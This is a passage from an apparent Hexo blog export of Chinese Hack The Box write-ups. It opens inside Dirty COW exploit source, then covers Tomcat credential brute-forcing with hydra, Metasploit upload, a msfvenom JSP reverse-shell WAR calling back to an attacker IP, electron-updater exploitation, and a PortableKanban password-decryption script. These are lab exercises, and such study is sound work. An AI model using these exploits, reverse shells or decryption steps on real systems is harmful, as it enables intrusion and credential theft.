&#123;</span><br><span class="line">    plaintext_pw = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter the new password: %s\n&quot;</span>, plaintext_pw);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    plaintext_pw = getpass(<span class="string">&quot;Please enter the new password: &quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  user.hash = generate_password_hash(plaintext_pw);</span><br><span class="line">  <span class="keyword">char</span> *complete_passwd_line = generate_passwd_line(user);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Complete line:\n%s\n&quot;</span>, complete_passwd_line);</span><br><span class="line"></span><br><span class="line">  f = open(filename, O_RDONLY);</span><br><span class="line">  fstat(f, &amp;st);</span><br><span class="line">  <span class="built_in">map</span> = mmap(<span class="literal">NULL</span>,</span><br><span class="line">             st.st_size + <span class="keyword">sizeof</span>(<span class="keyword">long</span>),</span><br><span class="line">             PROT_READ,</span><br><span class="line">             MAP_PRIVATE,</span><br><span class="line">             f,</span><br><span class="line">             <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;mmap: %lx\n&quot;</span>,(<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="built_in">map</span>);</span><br><span class="line">  pid = fork();</span><br><span class="line">  <span class="keyword">if</span>(pid) &#123;</span><br><span class="line">    waitpid(pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> u, i, o, c = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> l=<span class="built_in">strlen</span>(complete_passwd_line);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10000</span>/l; i++) &#123;</span><br><span class="line">      <span class="keyword">for</span>(o = <span class="number">0</span>; o &lt; l; o++) &#123;</span><br><span class="line">        <span class="keyword">for</span>(u = <span class="number">0</span>; u &lt; <span class="number">10000</span>; u++) &#123;</span><br><span class="line">          c += ptrace(PTRACE_POKETEXT,</span><br><span class="line">                      pid,</span><br><span class="line">                      <span class="built_in">map</span> + o,</span><br><span class="line">                      *((<span class="keyword">long</span>*)(complete_passwd_line + o)));</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ptrace %d\n&quot;</span>,c);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    pthread_create(&amp;pth,</span><br><span class="line">                   <span class="literal">NULL</span>,</span><br><span class="line">                   madviseThread,</span><br><span class="line">                   <span class="literal">NULL</span>);</span><br><span class="line">    ptrace(PTRACE_TRACEME);</span><br><span class="line">    kill(getpid(), SIGSTOP);</span><br><span class="line">    pthread_join(pth,<span class="literal">NULL</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Done! Check %s to see if the new user was created.\n&quot;</span>, filename);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You can log in with the username &#x27;%s&#x27; and the password &#x27;%s&#x27;.\n\n&quot;</span>,</span><br><span class="line">    user.username, plaintext_pw);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nDON&#x27;T FORGET TO RESTORE! $ mv %s %s\n&quot;</span>,</span><br><span class="line">    backup_filename, filename);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们将脏牛脚本下载到目标机器上<br><img src="https://img-blog.csdnimg.cn/7be0601d01a245d49b8a950a8e1a4dd1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后编译并运行这个脚本，新设置的密码为空</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gcc -pthread 40389.c -o dirty -lcrypt</span><br><span class="line">./dirty</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/cf62ba35819c4ce38f1c526d9914aeae.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/01e976057cfd436eaf24c2139dbc1cd0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="tmux提权"><a href="#tmux提权" class="headerlink" title="tmux提权"></a>tmux提权</h2><p>除了脏牛，我们还发现以root用户运行的tmux程序<br><img src="https://img-blog.csdnimg.cn/ee02125d05bb444ca867c42b495afc29.png" alt="在这里插入图片描述"><br>那么我们直接运行命令，就能够提权到root上了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/usr/bin/tmux -S /.devs/dev_sess</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/b4674887be004a4a8ba43204d0642eed.png" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>心脏滴血</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>Jerry</title>
    <url>/2021/12/24/Jerry/</url>
    <content><![CDATA[<h2 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h2><p><img src="https://img-blog.csdnimg.cn/d5f1dc82530e485e91e914d59c62f9ff.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>我们可以看到，目标主机只开放了8080端口，而且版本还是<code>7.0.88</code>的<br><img src="https://img-blog.csdnimg.cn/12b2a2ded3544b248ce0ae24e4c30139.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<span id="more"></span>

<p>我们立马登录tomcat页面，并且尝试账户和密码都是admin，看看能不能登录成功，结果是失败的。<br><img src="https://img-blog.csdnimg.cn/14569a31b1e04d76855654582e15e833.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/a1c59a404d30477d9434d5ca81214227.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>我们下载<code>seclists</code>这个工具，对tomcat的默认用户名和密码进行暴力破解<br><img src="https://img-blog.csdnimg.cn/4573275f27314e41997be90a187c528b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<!--more-->

<p>我们使用hydra工具对账号密码进行破解，发现账号是tomcat，密码是s3cret</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http://10.10.10.95:8080/manager/html</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/2e489a5e1395436f87bbc2c1c05db04b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h3 id="MSF获取权限"><a href="#MSF获取权限" class="headerlink" title="MSF获取权限"></a>MSF获取权限</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">search tomcat_mgr</span><br><span class="line">use exploit/multi/http/tomcat_upload</span><br><span class="line">show options</span><br><span class="line"><span class="built_in">set</span> rhosts 10.10.10.95</span><br><span class="line"><span class="built_in">set</span> lhost 10.10.14.11</span><br><span class="line"><span class="built_in">set</span> httpusername tomcat</span><br><span class="line"><span class="built_in">set</span> httppassword s3cret</span><br><span class="line"><span class="built_in">set</span> rport 8080</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/405b1654a30e4fd8b5ff405938d24a51.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们获取一个shell，发现已经是最高权限了<br><img src="https://img-blog.csdnimg.cn/efd9843d30e5431cbe6ae1408fbcb011.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那么我们就可以查看到flag值了<br><img src="https://img-blog.csdnimg.cn/89ecac8618f24fdf9edd6cf96a419036.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h3 id="NC反弹shell"><a href="#NC反弹shell" class="headerlink" title="NC反弹shell"></a>NC反弹shell</h3><p>首先我们先准备一个木马</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.11 lport=1234 -f war &gt; shell.war</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/c4abdde92c484b46ac8782a2c62da4fa.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们使用账号密码登录进部署页面，并将生成的木马部署进tomcat服务器上<br><img src="https://img-blog.csdnimg.cn/9dd05049c33f45cf971a5f70a9a6d2e8.png" alt="在这里插入图片描述"><br>然后我们启动nc进行监听，并且在浏览器上浏览我们刚刚上传的war包，反弹shell成功。<br><img src="https://img-blog.csdnimg.cn/fbcd897e89c149549ead8a54352163ae.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/488c679d14e64be28972f71dab63504a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>中间件</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>Atom</title>
    <url>/2021/12/24/Atom/</url>
    <content><![CDATA[<h2 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h2><p><img src="https://img-blog.csdnimg.cn/d7ff3a26ad1b4b0680f0d4283d757a77.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>可以看到靶机开放了80端口，那证明就存在web服务。<br><img src="https://img-blog.csdnimg.cn/71d80ba7cc3748c4a4f0402a9793083a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/458004df73e046d6ac29665f942ae2a1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<span id="more"></span>

<p>往下看的时候，发现guest用户可以登录smb服务，那我们就先看看smb服务里边都有哪些有价值的信息。<br><img src="https://img-blog.csdnimg.cn/35ce3f11c2ea4febac8767c3761d9f0f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>使用匿名登录看看可以访问到哪些信息，可以看到具有读写权限的目录只有<code>Software_Updates</code>这个目录<br><img src="https://img-blog.csdnimg.cn/901c2bdb6d4d4e7da7675e1c24ee1e36.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们登录进这个目录中，有一个pdf文件可以下载，我们下载查看了下里面的内容。<br><img src="https://img-blog.csdnimg.cn/2ecb65835531481289d535ee549568a4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/1edacfc8f7844517bae4f0e7dbd97af0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<!--more-->

<p>查看完这些信息后，我们继续访问web服务。在服务的底端存在一个邮箱账号和域名，我们先添加到hosts文件中，便于后面进行目录爆破和子域名的搜集。<br><img src="https://img-blog.csdnimg.cn/35cf8a81609b4187930f03c62fcf602d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那么我们就使用<code>gobuster</code>进行域名和目录的爆破吧<br><img src="https://img-blog.csdnimg.cn/916619d4e1dc4bfba3e44627be4f0f36.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/b59b2cb6beb94f13bd94e36d031e5dba.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现好像并没有什么有价值的信息，哎！还是老老实实去下载软件吧。。。<br><img src="https://img-blog.csdnimg.cn/cc46996341604dffb098519776c2cfc8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现是个exe程序，那我们把它丢Windows上运行看看效果是怎么样的<br><img src="https://img-blog.csdnimg.cn/aea7a78db0594a95b20e01811fc600ae.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们在yml文件中发现了这是一个电子应用程序<br><img src="https://img-blog.csdnimg.cn/1447b123093e4cf79c5fbdf992c90238.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们根据搜索到的信息，上谷歌进行搜索，可以看到有一位大佬发现了这个漏洞<br><img src="https://img-blog.csdnimg.cn/d4b8f3b4ba784683918c21291c351027.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/3576872644644aef95d67125deffcd4f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>大佬已经给出了漏洞利用的方法，首先先使用包含单引号的文件名，然后重新计算文件哈希以匹配攻击者提供的二进制文件。<br><img src="https://img-blog.csdnimg.cn/2ce2ad37d7314f4781ca47e3372b791c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先我们先生成一个带有单引号的有效载荷<br><img src="https://img-blog.csdnimg.cn/841300482268465f928a7a1c6029c243.png" alt="在这里插入图片描述"><br>然后我们按照上面的方法，生成一个 sha512 sum hash 并将其转换为十六进制，然后进一步转换为base64<br><img src="https://img-blog.csdnimg.cn/5222e5c555ae452499acff13d2f7999a.png" alt="在这里插入图片描述"><br>然后我们新建latest.yml这个文件，将上面生成的值进行复制粘贴<br><img src="https://img-blog.csdnimg.cn/d5c11c4ee72b45f09ef3842b265aec6b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>紧接着我们使用python开启一个服务器<br><img src="https://img-blog.csdnimg.cn/6a8bfdbfe08e4dbaad426ef2204b19f0.png" alt="在这里插入图片描述"><br>三个文件夹都要替换掉yml文件<br><img src="https://img-blog.csdnimg.cn/51201bef231a46a9a2b2221c45ffeb40.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/99de167220ab45808c982e771e32f731.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后我们在msf上对漏洞进行利用，设置好基本参数后，我们可以看到反弹的shell<br><img src="https://img-blog.csdnimg.cn/8cd39b8f18d34046a6a3a1abd41d1bd4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2ffa34dc528d4bffbf22bbff28573e83.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>我们先查看一下当前用户的权限</p>
<p><img src="https://img-blog.csdnimg.cn/46fc63e01a074f8780b9977a64491034.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>进入cmd终端进行操作<br><img src="https://img-blog.csdnimg.cn/572df466d9dd4791a92d255ca60aa7a7.png" alt="在这里插入图片描述"><br>进入<code>Program Files</code>这个目录查看主机都安装了哪些应用程序。可以看到安装了Redis数据库，是不是想试试未授权访问？这是直觉哈哈<br><img src="https://img-blog.csdnimg.cn/9a3ff33f781548e7be38f9fbb77d972b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们先进入这个目录，看看配置文件是否需要密码进行登录的。我们查找<code>redis.windows-service.conf</code>这个文件，使用命令<code>type redis.windows-service.conf | findstr requirepass</code>快速查找到登录数据库的密码<br><img src="https://img-blog.csdnimg.cn/bb3958f354d14907842c4a54f90141be.png" alt="在这里插入图片描述"><br>既然发现了密码，那我们直接尝试可不可以登录成功吧<br><img src="https://img-blog.csdnimg.cn/73ef19ef23b04f979996089529a2ec3b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们列出所有的hash看看，发现了一个比较有价值的信息<br><img src="https://img-blog.csdnimg.cn/21d54e0c5d914c8ea4288315af18521b.png" alt="在这里插入图片描述"><br>那我们查看一下user对应的信息，发现是一个管理员，并且还挖掘到了他对应的hash值<code>Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi</code><br><img src="https://img-blog.csdnimg.cn/3bf1bf2cbfb6417c9058a3d05d874987.png" alt="在这里插入图片描述"><br>既然涉及到用户信息，那我们就去Users目录下看看有没有什么有价值的信息吧。然而在jason的桌面上，我们看到了user.txt文件，拿到第一个flag值<img src="https://img-blog.csdnimg.cn/806ca1c22ee14f7fa5bb5688113ff486.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="t"><br>在jason的主机中，我们发现了他安装了两个应用程序，一个是<code>node_modules</code>和<code>PortableKanban</code><br><img src="https://img-blog.csdnimg.cn/171f022c449c4fdda60d7e6c67bca7a6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/1bc9495245b24508b8408bee3570a7e6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们查看一下cfg配置文件，发现了对应的hash值<code>Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb</code><br><img src="https://img-blog.csdnimg.cn/96ad43ed232e4c928dfb0b255cf0b550.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后我们在exploit-db中搜索到对应的漏洞利用代码<br><img src="https://img-blog.csdnimg.cn/c205078ffcc14aff81bba88d60aa34ad.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们对这个利用脚本进行简洁，让它直接输出对应的明文值。得到明文值<code>kidvscat_yes_kidvscat</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> des <span class="keyword">import</span> * <span class="comment">#python3 -m pip install des</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params"><span class="built_in">hash</span></span>):</span></span><br><span class="line">        <span class="built_in">hash</span> = base64.b64decode(<span class="built_in">hash</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        key = DesKey(<span class="string">b&quot;7ly6UznJ&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> key.decrypt(<span class="built_in">hash</span>,initial=<span class="string">b&quot;XuVUm5fR&quot;</span>,padding=<span class="literal">True</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(decode(<span class="string">&#x27;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/938feaacbc2d46888b987f570b3a166f.png" alt="在这里插入图片描述"></p>
<p>登录成功<br><img src="https://img-blog.csdnimg.cn/020f2b5f8b624d2b9420511bc70c6941.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>SMB</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
</search>
